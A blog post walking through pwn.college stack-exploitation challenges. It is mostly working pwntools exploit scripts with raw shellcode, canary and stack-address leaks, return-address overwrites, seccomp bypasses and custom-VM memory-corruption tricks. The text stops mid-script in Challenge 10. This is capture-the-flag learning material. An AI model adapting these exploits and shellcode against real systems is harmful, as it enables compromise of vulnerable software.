---
layout: post
title:  "Pwn College - Program Exploitation"
date:   2024-04-26 19:59:52 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Overview

This module is pretty cool, and contains multiple usermode stack exploitation scenarios. 

## Challenge 1

Very simple jump to shellcode. 

```python
from pwn import *
import os, sys
import struct

BINARY = '/challenge/toddlerone_level1.0'
elf = ELF(BINARY)
addr_main = elf.symbols['main']

p = process(BINARY)
# p = gdb.debug(BINARY)

shellcode = b"\x48\xBB\x2F\x66\x6C\x61\x67\x00\x00\x00\x53\x48\xC7\xC0\x02\x00\x00\x00\x48\x89\xE7\x48\xC7\xC6\x00\x00\x00\x00\x0F\x05\x48\xC7\xC7\x01\x00\x00\x00\x48\x89\xC6\x48\xC7\xC2\x00\x00\x00\x00\x49\xC7\xC2\xE8\x03\x00\x00\x48\xC7\xC0\x28\x00\x00\x00\x0F\x05\x48\xC7\xC0\x3C\x00\x00\x00\x0F\x05"
buf = b'A' * 120 + struct.pack('<Q', 0x1cd2b000)

p.recvuntil(b'Our stack pointer')
p.sendline(shellcode)

p.recvuntil(b'Payload size:')
p.sendline(str(len(buf)))

p.recvuntil(b'Send your payload')
p.send(buf)

p.interactive()
```

## Challenge 2

RWX stack, no ASLR, no canary. Meh.

```python
from pwn import *
import os, sys
import struct

BINARY = '/challenge/toddlerone_level2.0'
elf = ELF(BINARY)

p = process(BINARY)
# p = gdb.debug(BINARY)

shellcode = b"\x90" * 0x500 + b"\x48\xBB\x2F\x66\x6C\x61\x67\x00\x00\x00\x53\x48\xC7\xC0\x02\x00\x00\x00\x48\x89\xE7\x48\xC7\xC6\x00\x00\x00\x00\x0F\x05\x48\xC7\xC7\x01\x00\x00\x00\x48\x89\xC6\x48\xC7\xC2\x00\x00\x00\x00\x49\xC7\xC2\xE8\x03\x00\x00\x48\xC7\xC0\x28\x00\x00\x00\x0F\x05\x48\xC7\xC0\x3C\x00\x00\x00\x0F\x05"
buf = struct.pack('<Q', 0x00007fffffffd500) * 0x18 + shellcode

p.sendline(str(len(buf)))
p.send(buf)

p.interactive()
```

## Challenge 3

RWX stack, canary and ASLR and PIE exists. \
In order to overcome this, REPEAT backdoor resides. 

The idea is simple - using the REPEAT, we would insert non-truncated buffer, giving us a leak primitive that we may use. We would like to leak some stack address, so we would know the address of our shellcode. 

We first have to leak the canary value, as we’ve done in the previous module. We’d just fill the buffer (including the LSB null byte of the canary) to non-null characters, and we got the canary. \
However, in order to leak the stack address we can just overwrite the canary, making sure we supply the REPEAT characters within the buffer. That way, the program calls another challenge function and never returns, hence doesn’t performs the stack canary check. 

```python
from pwn import *
import os, sys
import struct

BINARY = '/challenge/toddlerone_level3.0'
elf = ELF(BINARY)
GDB_SCRIPT= '''
b challenge
c

c
c
'''

p = process(BINARY)
# p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)

header = b'REPEAT'
padding = b'A' * (88 - len(header))

# Leak canary
buf_1 = header + padding + b'B'  # The LSB of the canary is always 0x00. Hence, we need to overwrite it in order to see the result. 
p.sendline(str(len(buf_1)))
p.send(buf_1)
while True:
    data = p.recvline()
    if buf_1 in data:
        start_index = data.find(buf_1) + len(buf_1) - 1  # -1 As we also take the fake "B" LSB
        canary = struct.unpack('<Q', data[start_index: start_index + 8])[0] & 0xffffffffffffff00
        print(f'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Canary value:{hex(canary)}')
        break

canary_bytes = struct.pack('<Q', canary)

# Leak rbp
buf_2 = header + padding + b'B' * 8
p.sendline(str(len(buf_2)))
p.send(buf_2)

while True:
    data = p.recvline()
    if buf_2 in data:
        start_index = data.find(buf_2) + len(buf_2)
        print(f'Data is:{data} index:{start_index}')
        rbp_leak = data[start_index: start_index + 6] + b'\x00' * 2 # 6 instead of 8, as always the 2 MSBs are \x00
        assert(len(rbp_leak) == 8)
        print(f'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@RBP value:{rbp_leak}')
        break

shellcode = b"\x90" * 0x300 + b"\x48\xBB\x2F\x66\x6C\x61\x67\x00\x00\x00\x53\x48\xC7\xC0\x02\x00\x00\x00\x48\x89\xE7\x48\xC7\xC6\x00\x00\x00\x00\x0F\x05\x48\xC7\xC7\x01\x00\x00\x00\x48\x89\xC6\x48\xC7\xC2\x00\x00\x00\x00\x49\xC7\xC2\xE8\x03\x00\x00\x48\xC7\xC0\x28\x00\x00\x00\x0F\x05\x48\xC7\xC0\x3C\x00\x00\x00\x0F\x05"
buf_3 = b'C' * 88 + canary_bytes + b'D' * 8 + rbp_leak + shellcode  # Overwrite RA with rbp addr for simplicity, overflow is large enough
p.sendline(str(len(buf_3)))
p.send(buf_3)

p.interactive()
```

## Challenge 4

Added an exit condition, that can be avoided via certain magic.

```python
from pwn import *
import os, sys
import struct

BINARY = '/challenge/toddlerone_level4.0'
elf = ELF(BINARY)
GDB_SCRIPT= '''
b challenge
c


'''

p = process(BINARY)
# p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
PAD_LENGTH = 56

header = b'REPEAT'
padding = b'A' * (PAD_LENGTH - len(header))

# Leak canary
buf_1 = header + padding + b'B'  # The LSB of the canary is always 0x00. Hence, we need to overwrite it in order to see the result. 
p.sendline(str(len(buf_1)))
p.send(buf_1)

while True:
    data = p.recvline()
    if buf_1 in data:
        start_index = data.find(buf_1) + len(buf_1) - 1  # -1 As we also take the fake "B" LSB
        canary = struct.unpack('<Q', data[start_index: start_index + 8])[0] & 0xffffffffffffff00
        print(f'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Canary value:{hex(canary)}')
        break

canary_bytes = struct.pack('<Q', canary)

# Leak rbp
buf_2 = header + padding + b'B' * 8
p.sendline(str(len(buf_2)))
p.send(buf_2)

while True:
    data = p.recvline()
    if buf_2 in data:
        start_index = data.find(buf_2) + len(buf_2)
        print(f'Data is:{data} index:{start_index}')
        rbp_leak = data[start_index: start_index + 6] + b'\x00' * 2 # 6 instead of 8, as always the 2 MSBs are \x00
        assert(len(rbp_leak) == 8)
        print(f'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@RBP value:{rbp_leak}')
        break

magic_bytes = struct.pack('<Q', 0xb7374f0277b0dd3) * int(PAD_LENGTH / 8)
shellcode = b"\x90" * 0x300 + b"\x48\xBB\x2F\x66\x6C\x61\x67\x00\x00\x00\x53\x48\xC7\xC0\x02\x00\x00\x00\x48\x89\xE7\x48\xC7\xC6\x00\x00\x00\x00\x0F\x05\x48\xC7\xC7\x01\x00\x00\x00\x48\x89\xC6\x48\xC7\xC2\x00\x00\x00\x00\x49\xC7\xC2\xE8\x03\x00\x00\x48\xC7\xC0\x28\x00\x00\x00\x0F\x05\x48\xC7\xC0\x3C\x00\x00\x00\x0F\x05"
buf_3 = magic_bytes + canary_bytes + b'D' * 8 + rbp_leak + shellcode  # Overwrite RA with rbp addr for simplicity, overflow is large enough
p.sendline(str(len(buf_3)))
p.send(buf_3)

p.interactive()
```

## Challenge 5

Now there’s also seccomp. \
The only real difference is having more data between the canary and rbp, as we use `chmod` shellcode. 

```python
from pwn import *
import os, sys
import struct

BINARY = '/challenge/toddlerone_level5.0'
elf = ELF(BINARY)
GDB_SCRIPT= '''
b challenge
c


'''

p = process(BINARY)
# p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
PAD_LENGTH = 72

header = b'REPEAT'
padding = b'A' * (PAD_LENGTH - len(header))

# Leak canary
buf_1 = header + padding + b'B'  # The LSB of the canary is always 0x00. Hence, we need to overwrite it in order to see the result. 
p.sendline(str(len(buf_1)))
p.send(buf_1)

while True:
    data = p.recvline()
    if buf_1 in data:
        start_index = data.find(buf_1) + len(buf_1) - 1  # -1 As we also take the fake "B" LSB
        canary = struct.unpack('<Q', data[start_index: start_index + 8])[0] & 0xffffffffffffff00
        print(f'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Canary value:{hex(canary)}')
        break

canary_bytes = struct.pack('<Q', canary)

# Leak rbp
buf_2 = header + padding + b'B' * 0x18
p.sendline(str(len(buf_2)))
p.send(buf_2)

while True:
    data = p.recvline()
    if buf_2 in data:
        start_index = data.find(buf_2) + len(buf_2)
        print(f'Data is:{data} index:{start_index}')
        rbp_leak = data[start_index: start_index + 6] + b'\x00' * 2 # 6 instead of 8, as always the 2 MSBs are \x00
        assert(len(rbp_leak) == 8)
        print(f'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@RBP value:{rbp_leak}')
        break

magic_bytes = struct.pack('<Q', 0x747bc57ca48fc14e) * int(PAD_LENGTH / 8)
shellcode = b"\x90" * 0x300 + b"\x48\xBB\x2F\x66\x6C\x61\x67\x00\x00\x00\x53\x48\xC7\xC0\x02\x00\x00\x00\x48\x89\xE7\x48\xC7\xC6\x00\x00\x00\x00\x0F\x05\x48\xC7\xC7\x01\x00\x00\x00\x48\x89\xC6\x48\xC7\xC2\x00\x00\x00\x00\x49\xC7\xC2\xE8\x03\x00\x00\x48\xC7\xC0\x28\x00\x00\x00\x0F\x05\x48\xC7\xC0\x3C\x00\x00\x00\x0F\x05"
buf_3 = magic_bytes + canary_bytes + b'D' * 0x18 + rbp_leak + shellcode  # Overwrite RA with rbp addr for simplicity, overflow is large enough
p.sendline(str(len(buf_3)))
p.send(buf_3)

p.interactive()

```

## Challenge 6

Now the seccomp filter loads its syscall arguments from the stack. Hence, we can overwrite them to our wish. \
However, it seems we can overwrite only 2 syscalls, and we have to set one of them to `write` in order for the puts call in the end of challenge to work. A possible approach is to use mmap to map the file into memory, and use write to leak its value to stdout. However, this won’t work - as mmap requires an open fd..

Another approach is using chmod on the flag, and give it some user permissions.

```python
from pwn import *
import os, sys
import struct

BINARY = '/challenge/toddlerone_level6.0'
elf = ELF(BINARY)
GDB_SCRIPT= '''
b challenge
c

c
c
'''

p = process(BINARY)
# p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
PAD_LENGTH = 72

header = b'REPEAT'
padding = b'A' * (PAD_LENGTH - len(header))

# Leak canary
buf_1 = header + padding + b'B'  # The LSB of the canary is always 0x00. Hence, we need to overwrite it in order to see the result. 
p.sendline(str(len(buf_1)))
p.send(buf_1)

while True:
    data = p.recvline()
    if buf_1 in data:
        start_index = data.find(buf_1) + len(buf_1) - 1  # -1 As we also take the fake "B" LSB
        canary = struct.unpack('<Q', data[start_index: start_index + 8])[0] & 0xffffffffffffff00
        print(f'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Canary value:{hex(canary)}')
        break

canary_bytes = struct.pack('<Q', canary)

# Leak rbp
canary_to_rbp_delta = 0x18
buf_2 = header + padding + b'B' * canary_to_rbp_delta
p.sendline(str(len(buf_2)))
p.send(buf_2)

while True:
    data = p.recvline()
    if buf_2 in data:
        start_index = data.find(buf_2) + len(buf_2)
        print(f'Data is:{data} index:{start_index}')
        rbp_leak = data[start_index: start_index + 6] + b'\x00' * 2 # 6 instead of 8, as always the 2 MSBs are \x00
        assert(len(rbp_leak) == 8)
        print(f'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@RBP value:{rbp_leak}')
        break


seccomp_fake_syscalls = (struct.pack('<Q', 0x100000000) + struct.pack('<Q', 0x5a)) * int(PAD_LENGTH / 16) + b'E' * (PAD_LENGTH % 16)
# This is a chmod("flag") shellcode
shellcode = b"\x90" * 0x500 + b"\x48\xBB\x2F\x66\x6C\x61\x67\x00\x00\x00\x53\x48\xC7\xC0\x5A\x00\x00\x00\x48\x89\xE7\x48\xC7\xC6\x77\x07\x00\x00\x0F\x05"
buf_3 = seccomp_fake_syscalls + canary_bytes + b'D' * canary_to_rbp_delta + rbp_leak + shellcode  # Overwrite RA with rbp addr for simplicity, overflow is large enough
p.sendline(str(len(buf_3)))
p.send(buf_3)

p.interactive()
```

## Challenge 7

We’re given a custom-made assembly language - yan85 code. 

There’s a forward stack overflow vuln within the handler of `read_memory` syscall. \
The method allows reading up to 255 bytes into mem`[768 + reg_b]`, where the max value of `reg_b` may be 255. \
In that case, we can write 255 bytes starting from `mem[1023]`. This means we can access memory out of the bounds of the 1024-byte memory buffer. \
Recall this buffer is allocated right within main initialization, hence **the only stack frame we would be able to corrupt is main’s**. \
Therefore, we have to terminate the interpreter loop gracefully, and corrupt main’s return address.

```python
from dataclasses import dataclass
from pwn import *
import os, sys
import struct


BINARY = '/challenge/toddlerone_level7.0'
GDB_SCRIPT= '''
b *0x4026b1

c

'''

@dataclass
class Regs:
    a = b'\x02'
    b = b'\x01'
    c = b'\x04'
    d = b'\x10'
    s = b'\x08'
    i = b'\x40'
    f = b'\x20'

@dataclass
class Opcodes:
    STM = b'\x01'
    IMM = b'\x02'
    ADD = b'\x04'
    CMP = b'\x08'
    JMP = b'\x10'
    LDM = b'\x20'
    STK = b'\x40'
    SYSCALL = b'\x80'

@dataclass
class Syscalls:
    READ_CODE = b'\x02'
    READ_MEM = b'\x04'
    WRITE = b'\x01'
    SLEEP = b'\x20'
    EXIT = b'\x08'


def syscall(number, out_reg):
    return number + out_reg + Opcodes.SYSCALL

def write_register(register, value):
    assert(value < 0x100)
    return register + value.to_bytes(1, 'little') + Opcodes.IMM

def read_stdin_to_memory(offset, count):
    buffer = b''
    buffer += write_register(Regs.a, value=0)  # stdin
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    buffer += syscall(Syscalls.READ_MEM, out_reg=Regs.a)
    return buffer

def read_junk(p, magic):
    while True:
        data = p.readline()
        print(data)
        if magic in data:
            break

def exploit():
    p = process(BINARY)
    # p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)

    bytes_count = 0xff
    buf_1 = b''
    buf_1 += read_stdin_to_memory(offset=0xf0, count=bytes_count)

    p.send(buf_1)

    # Cause termination of the interpreter loop by setting mem[1029] to 0xff.
    # Pad, and overwrite the return address back to the stack. 
    # Notice we jump right into the middle of our payload, at constant addr. 
    shellcode = b"\x48\xBB\x2F\x66\x6C\x61\x67\x00\x00\x00\x53\x48\xC7\xC0\x5A\x00\x00\x00\x48\x89\xE7\x48\xC7\xC6\x77\x07\x00\x00\x0F\x05"
    buf_2 = b'\x41' * 0x15 + b'\xff' + b'\x42' * 2 + struct.pack('<Q', 0x7fffffffe320) * 11
    payload = buf_2 + b'\x90' * (bytes_count - len(buf_2) - len(shellcode)) + shellcode 
    p.send(payload)

    p.interactive()

exploit()
```

For the mirror stage, I was needed to update the offsets, as well as to change the instruction layout.

## Challenge 8

Pretty similar to before, but now there’s also ASLR, a canary, and the binary is PIE. \
We can leak a stack address as well as the canary value easily via the write handler. 

```python
from dataclasses import dataclass
from pwn import *
import os, sys
import struct


BINARY = '/challenge/toddlerone_level8.0'
GDB_SCRIPT= '''
b *interpret_sys+0x1e4
b *main+0x2ee

c

'''

@dataclass
class Regs:
    a = b'\x01'
    b = b'\x04'
    c = b'\x40'
    d = b'\x10'
    s = b'\x02'
    i = b'\x08'
    f = b'\x20'

@dataclass
class Opcodes:
    STM = b''
    IMM = b'\x40'
    ADD = b''
    CMP = b''
    JMP = b''
    LDM = b''
    STK = b''
    SYSCALL = b'\x20'

@dataclass
class Syscalls:
    OPEN = b'\x01'
    READ_CODE = b''
    READ_MEM = b'\x08'
    WRITE_MEM = b'\x04'
    SLEEP = b''
    EXIT = b''


def syscall(number, out_reg):
    return out_reg + number + Opcodes.SYSCALL 

def write_register(register, value):
    assert(value < 0x100)
    return value.to_bytes(1, 'little') + register + Opcodes.IMM

def read_stdin_to_memory(offset, count):
    buffer = b''
    buffer += write_register(Regs.a, value=0)  # stdin
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    buffer += syscall(Syscalls.READ_MEM, out_reg=Regs.a)
    return buffer

def write_stdout_from_memory(offset, count):
    buffer = b''
    buffer += write_register(Regs.a, value=1)  # stdout
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    buffer += syscall(Syscalls.WRITE_MEM, out_reg=Regs.a)
    return buffer

def force_crash():
    buffer = b''
    buffer += syscall(Syscalls.OPEN, out_reg=Regs.a)
    return buffer

def leak_stack_content(p, count):
    # Get rid off junk
    p.readuntil(b'Please input your yancode:')  
    p.readuntil(b'Starting interpreter loop! Good luck!')
    
    while True:
        data = p.readline()
        if not data.startswith(b'[') and len(data) > count:
            canary_bytes = data[0x18: 0x20]
            canary = struct.unpack('<Q', canary_bytes)[0]
            assert(canary & 0x00000000000000ff == 0)

            stack_leak_bytes = data[0x38: 0x40]
            stack_leak = struct.unpack('<Q', stack_leak_bytes)[0]

            break
    

    return stack_leak, canary

def exploit():
    p = process(BINARY)
    # p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)

    read_count = 0x40
    buf_0 = b''
    buf_0 += write_stdout_from_memory(offset=0xf0, count=read_count)

    write_count = 0xff
    buf_1 = b''
    buf_1 += read_stdin_to_memory(offset=0xf0, count=write_count)

    yan_buf = buf_0 + buf_1
    p.send(yan_buf)

    stack_leak, canary = leak_stack_content(p, count=read_count)
    shellcode_addr = stack_leak - 0xb0
    print(f'Shellcode Addr:{hex(shellcode_addr)} Canary:{hex(canary)}')

    # Cause termination of the interpreter loop by setting mem[1029] to 0xff.
    # Pad, and overwrite the return address back to the stack
    shellcode = b"\x48\xBB\x2F\x66\x6C\x61\x67\x00\x00\x00\x53\x48\xC7\xC0\x5A\x00\x00\x00\x48\x89\xE7\x48\xC7\xC6\x77\x07\x00\x00\x0F\x05"
    buf_2 = b'\x41' * 0x15 + b'\xff' + b'\x42' * 2 + struct.pack('<Q', canary) * 2 + struct.pack('<Q', shellcode_addr)
    payload = buf_2 + b'\x90' * (write_count - len(buf_2) - len(shellcode)) + shellcode 
    p.send(payload)

    p.interactive()

exploit()
```

And the mirror stage:

```python
from dataclasses import dataclass
from pwn import *
import os, sys
import struct


BINARY = '/challenge/toddlerone_level8.1'
GDB_SCRIPT= '''
b *interpret_sys+0x1e4
b *main+0x2ee

c

'''
DEBUG_FILE_PATH = 'my_payload.txt'

@dataclass
class Regs:
    a = b'\x08'
    b = b'\x04'
    c = b'\x02'
    d = b'\x40'
    s = b'\x01'
    i = b'\x20'
    f = b'\x10'

@dataclass
class Opcodes:
    STM = b''
    IMM = b'\x80'
    ADD = b''
    CMP = b''
    JMP = b''
    LDM = b''
    STK = b''
    SYSCALL = b'\x08'

@dataclass
class Syscalls:
    OPEN = b'\x02'
    READ_CODE = b''
    READ_MEM = b'\x10'
    WRITE_MEM = b'\x08'
    SLEEP = b''
    EXIT = b''

def syscall(number, out_reg):
    return out_reg + number + Opcodes.SYSCALL

def write_register(register, value):
    assert(value < 0x100)
    return value.to_bytes(1, 'little') + register + Opcodes.IMM

def read_stdin_to_memory(offset, count):
    buffer = b''
    buffer += write_register(Regs.a, value=0)  # stdin
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    buffer += syscall(Syscalls.READ_MEM, out_reg=Regs.a)
    return buffer

def write_stdout_from_memory(offset, count):
    buffer = b''
    buffer += write_register(Regs.a, value=1)  # stdout
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    buffer += syscall(Syscalls.WRITE_MEM, out_reg=Regs.a)
    return buffer

def force_crash():
    buffer = b''
    buffer += syscall(Syscalls.OPEN, out_reg=Regs.a)
    return buffer

def leak_stack_content(p, count):
    # Get rid off junk
    p.readuntil(b'Please input your yancode:')  
    p.readuntil(b'Starting interpreter loop! Good luck!')
    p.readline()  

    while True:
        data = p.read(count)
        print(f'Data:{data}')
        if not data.startswith(b'[') and len(data) >= count:
            canary_bytes = data[0x18: 0x20]
            canary = struct.unpack('<Q', canary_bytes)[0]
            assert(canary & 0x00000000000000ff == 0)

            stack_leak_bytes = data[0x38: 0x40]
            stack_leak = struct.unpack('<Q', stack_leak_bytes)[0]

            break
    

    return stack_leak, canary

def exploit():
    p = process(BINARY)
    # p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)

    read_count = 0x40
    buf_0 = b''
    buf_0 += write_stdout_from_memory(offset=0xf0, count=read_count)

    write_count = 0xff
    buf_1 = b''
    buf_1 += read_stdin_to_memory(offset=0xf0, count=write_count)

    yan_buf = buf_0 + buf_1
    with open(DEBUG_FILE_PATH, 'wb') as f:
        f.write(yan_buf)
    p.send(yan_buf)

    stack_leak, canary = leak_stack_content(p, count=read_count)
    shellcode_addr = stack_leak - 0xb0
    print(f'Shellcode Addr:{hex(shellcode_addr)} Canary:{hex(canary)}')

    # Cause termination of the interpreter loop by setting mem[1029] to 0xff.
    # Pad, and overwrite the return address back to the stack
    shellcode = b"\x48\xBB\x2F\x66\x6C\x61\x67\x00\x00\x00\x53\x48\xC7\xC0\x5A\x00\x00\x00\x48\x89\xE7\x48\xC7\xC6\x77\x07\x00\x00\x0F\x05"
    buf_2 = b'\x41' * 0x15 + b'\xff' + b'\x42' * 2 + struct.pack('<Q', canary) * 2 + struct.pack('<Q', shellcode_addr)
    payload = buf_2 + b'\x90' * (write_count - len(buf_2) - len(shellcode)) + shellcode 
    p.send(payload)

    p.interactive()

exploit()
```

## Challenge 9

Now we can perform the `open` syscall, as well as `read_mem` and `write`. However, we’re limited to only one syscall. \
We can bypass this limitation by overflowing the memory that stores the value of the syscall count. 

Indeed, within `main`’s frame, it is stored at `rbp - 0x418`, which is a stack address we can easily overflow. We would set it to some negative value, as the check is signed. \
However, this approach won’t work - as the check is performed on the yancode shellcode before anything is even executed. 

There’s a vuln within `read_memory` handler. We can write up to `0xff` bytes into the data region, which resides at `mem[0, 255]`. We can also choose an offset to start writing from, which can be up to `0xff` too. \
Therefore, we can overflow from the data segment towards the code segment, hence injecting syscalls of our wish. 

```python
from dataclasses import dataclass
from pwn import *
import os, sys
import struct


BINARY = '/challenge/toddlerone_level9.0'
GDB_SCRIPT= '''
b *interpret_sys+0x95

c

'''
DEBUG_FILE_PATH = 'my_payload.txt'

@dataclass
class Regs:
    a = b'\x02'
    b = b'\x20'
    c = b'\x08'
    d = b'\x01'
    s = b'\x40'
    i = b'\x04'
    f = b'\x10'


@dataclass
class Opcodes:
    STM = b''
    IMM = b'\x80'
    ADD = b''
    CMP = b''
    JMP = b''
    LDM = b''
    STK = b''
    SYSCALL = b'\x08'


@dataclass
class Syscalls:
    OPEN = b'\x02'
    READ_CODE = b''
    READ_MEM = b'\x08'
    WRITE_MEM = b'\x10'
    SLEEP = b''
    EXIT = b''


def syscall(number, out_reg):
    return Opcodes.SYSCALL + out_reg + number


def write_register(register, value):
    assert(value < 0x100)
    return Opcodes.IMM + value.to_bytes(1, 'little') + register


def open_file(file_addr):
    buffer = b''
    buffer += write_register(register=Regs.a, value=file_addr)
    buffer += write_register(register=Regs.b, value=2)  # O_RDWR
    buffer += write_register(register=Regs.c, value=0)  # mode, Irrelevant
    buffer += syscall(Syscalls.OPEN, out_reg=Regs.a)
    return buffer


def read_stdin_to_memory(offset, count):
    return read_to_memory(0, offset, count)


def read_to_memory(fd, offset, count):
    buffer = b''
    buffer += write_register(Regs.a, value=fd)
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    buffer += syscall(Syscalls.READ_MEM, out_reg=Regs.a)
    return buffer


def write_stdout_from_memory(offset, count):
    buffer = b''
    buffer += write_register(Regs.a, value=1)  # stdout
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    buffer += syscall(Syscalls.WRITE_MEM, out_reg=Regs.a)
    return buffer


def force_crash():
    buffer = b''
    buffer += syscall(Syscalls.OPEN, out_reg=Regs.a)
    return buffer


def leak_stack_content(p, count):
    # Get rid off junk
    p.readuntil(b'Please input your yancode:')  
    p.readuntil(b'Starting interpreter loop! Good luck!')
    p.readline()  

    while True:
        data = p.read(count)
        print(f'Data:{data}')
        if not data.startswith(b'[') and len(data) >= count:
            canary_bytes = data[0x18: 0x20]
            canary = struct.unpack('<Q', canary_bytes)[0]
            assert(canary & 0x00000000000000ff == 0)

            stack_leak_bytes = data[0x38: 0x40]
            stack_leak = struct.unpack('<Q', stack_leak_bytes)[0]
            break

    return stack_leak, canary

def exploit():
    p = process(BINARY)

    yan_shellcode_length = 0xff
    FLAG_PATH = b'/flag'
    flag_addr = 0
    
    yan_buf = b''
    yan_buf += read_stdin_to_memory(offset=0xff, count=yan_shellcode_length)
    with open(DEBUG_FILE_PATH, 'wb') as f:
        f.write(yan_buf)
    p.send(yan_buf)

    yan_shellcode = b'\x41' * (1 + len(yan_buf))  # Pad the existing instructions
    yan_shellcode += read_stdin_to_memory(offset=flag_addr, count=len(FLAG_PATH))
    yan_shellcode += open_file(file_addr=flag_addr)
    yan_shellcode += read_to_memory(fd=3, offset=0, count=0xff)
    yan_shellcode += write_stdout_from_memory(offset=0, count=0xff)
    yan_shellcode += b'\x42' * (yan_shellcode_length - len(yan_shellcode))
    p.send(yan_shellcode)
    p.send(FLAG_PATH)

    p.interactive()

exploit()
```

## Challenge 10

Logical vulns only! No memory corruption at all, as well as only a single syscall.

My approach - research the interpreter checks for syscall handler. \
It is extremely sus that instead of a switch case, **we may actually trigger all 8 handlers at once** by issuing `0xff` - as all of their bits are on. \ 
Moreover, the result of the previous handler is saved within `instr` of the preceding instruction.

By the exact same approach - **we can issue all of the syscalls at once!**

```python
from dataclasses import dataclass
from pwn import *
import os, sys
import struct


BINARY = '/challenge/toddlerone_level10.1'
GDB_SCRIPT= '''
tbreak __libc_start_main
commands
print("breaking CMP")
#b *$rdi-0x1b75+0x176a

print("breaking ADD")
#b *$rdi-0x1b75+0x1492

print("breaking SYS_read")
b *$rdi-0x1b75+0x18d7
end

c

commands 2
print("SYS_READ")
end

'''
DEBUG_FILE_PATH = 'my_payload.txt'

@dataclass
class Regs:
    a = b'\x10'
    b = b'\x01'
    c = b'\x02'
    d = b'\x08'
    s = b'\x04'
    i = b'\x20'
    f = b'\x40'


@dataclass
class Opcodes:
    STM = b''
    IMM = b'\x08'
    ADD = b'\x10'
    CMP = b'\x04'
    JMP = b'\x01'
    LDM = b''
    STK = b''
    SYSCALL = b'\x40'


@dataclass
class Syscalls:
    OPEN = b'\x20'
    READ_CODE = b''
    READ_MEM = b'\x10'
    WRITE_MEM = b'\x08'
    SLEEP = b''
    EXIT = b''


@dataclass
class Flags:
    UNCONDITIONAL = b'\x00'
    EQUAL = b'\x04'


def instruction(opcode, reg1, reg2):
    return opcode + reg2 + reg1


def compare(reg1, reg2):
    buffer = b''
    buffer += instruction(Opcodes.CMP, reg1, reg2)
    return buffer


def syscall(number, out_reg):
    return instruction(Opcodes.SYSCALL, number, out_reg)


def write_register(register, value):
    assert(value < 0x100)
    return instruction(Opcodes.IMM, register, value.to_bytes(1, 'little'))


def jump_register(register, flags):
    buffer = b''
    buffer += instruction(Opcodes.JMP, flags, register)
    return buffer


def jump(addr, flags):
    buffer = b''
    buffer += write_register(Regs.s, addr)
    buffer += jump_register(Regs.s, flags)
    return buffer


def open_file(file_addr):
    buffer = b''
    buffer += write_register(register=Regs.a, value=file_addr)
    buffer += write_register(register=Regs.b, value=2)  # O_RDWR
    buffer += write_register(register=Regs.c, value=0)  # mode, Irrelevant
    buffer += syscall(Syscalls.OPEN, out_reg=Regs.a)
    return buffer


def open_gigasyscall(file_addr, expected_d):
    buffer = b''
    buffer += write_register(register=Regs.a, value=file_addr)
    buffer += write_register(register=Regs.b, value=2)  # O_RDWR
    buffer += write_register(register=Regs.c, value=0)  # mode, Irrelevant
    # Using reg_s as a general purpose here.
    # We want this code to jump to the giga syscall only in its first invocation.
    buffer += write_register(Regs.s, value=expected_d)
    buffer += compare(reg1=Regs.d, reg2=Regs.s) 
    buffer += jump(addr=2, flags=Flags.EQUAL)
    return buffer


def read_stdin_to_memory(offset, count):
    return read_to_memory(0, offset, count)


def read_to_memory(fd, offset, count):
    buffer = b''
    buffer += write_register(Regs.a, value=fd)
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    buffer += syscall(Syscalls.READ_MEM, out_reg=Regs.a)
    return buffer


def read_to_memory_gigasyscall(fd, offset, count, expected_d):
    buffer = b''
    buffer += write_register(Regs.a, value=fd)
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    # Using reg_s as a general purpose here.
    # We want this code to jump to the giga syscall only in its first invocation.
    buffer += write_register(Regs.s, value=expected_d)
    buffer += compare(reg1=Regs.d, reg2=Regs.s) 
    buffer += jump(addr=2, flags=Flags.EQUAL)
    return buffer


def write_stdout_from_memory(offset, count):
    buffer = b''
    buffer += write_register(Regs.a, value=1)  # stdout
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    buffer += syscall(Syscalls.WRITE_MEM, out_reg=Regs.a)
    return buffer


def write_from_memory_gigasyscall(fd, offset, count, expected_d):
    buffer = b''
    buffer += write_register(Regs.a, value=fd)  # out file
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    buffer += write_register(Regs.s, value=expected_d)
    buffer += compare(reg1=Regs.d, reg2=Regs.s) 
    buffer += jump(addr=2, flags=Flags.EQUAL)
    return buffer


def giga_syscall():
    buffer = b''
    # Always activate these 3 syscalls
    numbers = int(int.from_bytes(Syscalls.OPEN, 'little') | int.from_bytes(Syscalls.READ_MEM, 'little') | int.from_bytes(Syscalls.WRITE_MEM, 'little')).to_bytes(1, 'little')
    # Out register - always reg_s as we don't care
    buffer += syscall(numbers, Regs.s)
    return buffer


def inc_reg(reg):
    # Note - initially sets Regs.s to 1!
    buffer = b''
    buffer += write_register(Regs.s, 1)
    buffer += instruction(Opcodes.ADD, reg, Regs.s)
    return buffer


def exploit():
    p = process(BINARY, close_fds=False)
